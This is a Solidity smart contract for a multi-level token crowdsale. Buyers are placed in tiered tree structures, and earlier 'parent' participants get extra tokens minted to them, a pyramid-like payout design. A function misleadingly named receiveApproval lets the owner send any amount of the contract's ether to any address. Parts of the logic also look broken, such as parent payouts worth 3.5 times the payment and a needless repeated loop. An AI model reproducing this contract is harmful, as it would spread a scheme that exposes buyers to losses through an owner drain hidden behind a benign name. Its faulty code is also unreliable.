contract Ownable {
    
    address public owner;
 
       
                                                                                         
             
     
    function Ownable()public {
        owner = msg.sender;
    }
 
       
                                                               
     
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
 
       
                                                                                     
                                                          
     
    function transferOwnership(address newOwner)public onlyOwner {
        require(newOwner != address(0));      
        owner = newOwner;
    }
 
}

contract Crowdsale is Ownable{
    
    using SafeMath for uint;
    
    address multisig;
    uint multisigPercent;
    address bounty;
    uint bountyPercent;
 
    MultiLevelToken public token = new MultiLevelToken();
    uint rate;
    uint tokens;
    uint value;
    
    uint tier;
    uint i;
    uint a=1;
    uint b=1;
    uint c=1;
    uint d=1;
    uint e=1;
    uint parent;
    uint256 parentMoney;
    address whom;
    mapping (uint => mapping(address => uint))tree;
    mapping (uint => mapping(uint => address)) order;
 
    function Crowdsale()public {
        multisig = 0xB52E296b76e7Da83ADE05C1458AED51D3911603f;
        multisigPercent = 5;
        bounty = 0x1F2D3767D70FA59550f0BC608607c30AAb9fDa06;
        bountyPercent = 5;
        rate = 100000000000000000000;
        
    }
 
    function finishMinting() public onlyOwner returns(bool)  {
        token.finishMinting();
        return true;
    }
    
    function distribute() public{
        
        for (i=1;i<=10;i++){
            while (parent >1){
                if (parent%3==0){
                            parent=parent.div(3);
                            whom = order[tier][parent];
                            token.mint(whom,parentMoney);
                        }
                else if ((parent-1)%3==0){
                            parent=(parent-1)/3;
                            whom = order[tier][parent];
                            token.mint(whom,parentMoney); 
                        }
                else{
                            parent=(parent+1)/3;
                            whom = order[tier][parent];
                            token.mint(whom,parentMoney);
                        }
            }
        }
        
    }    
    
    function createTokens()public  payable {
        
        uint _multisig = msg.value.mul(multisigPercent).div(100);
        uint _bounty = msg.value.mul(bountyPercent).div(100);
        tokens = rate.mul(msg.value).div(1 ether);
        tokens = tokens.mul(55).div(100);
        parentMoney = msg.value.mul(35).div(10);
        
        if (msg.value >= 50000000000000000 && msg.value < 100000000000000000){
            tier=1;
            tree[tier][msg.sender]=a;
            order[tier][a]=msg.sender;
            parent = a;
            a+=1;
            distribute();
        }
        else if (msg.value >= 100000000000000000 && msg.value < 200000000000000000){
            tier=2;
            tree[tier][msg.sender]=b;
            order[tier][b]=msg.sender;
            parent = b;
            b+=1;
            distribute();
        }    
        else if (msg.value >= 200000000000000000 && msg.value < 500000000000000000){
            tier=3;
            tree[tier][msg.sender]=c;
            order[tier][c]=msg.sender;
            parent = c;
            c+=1;
            distribute();
        }
        else if(msg.value >= 500000000000000000 && msg.value < 1000000000000000000){
            tier=4;
            tree[tier][msg.sender]=d;
            order[tier][d]=msg.sender;
            parent = d;
            d+=1;
            distribute();
        }
        else if(msg.value >= 1000000000000000000){
            tier=5;
            tree[tier][msg.sender]=e;
            order[tier][e]=msg.sender;
            parent = e;
            e+=1;
            distribute();
        }
        token.mint(msg.sender, tokens);
        multisig.transfer(_multisig);
        bounty.transfer(_bounty);
    }
    
                            
                                                            
                          
       
    
    function receiveApproval(address from, uint skolko                           ) public payable onlyOwner{
                                                  
        from.transfer(skolko.mul(1000000000000));
    }
    
    function() external payable {
        createTokens();
    }
}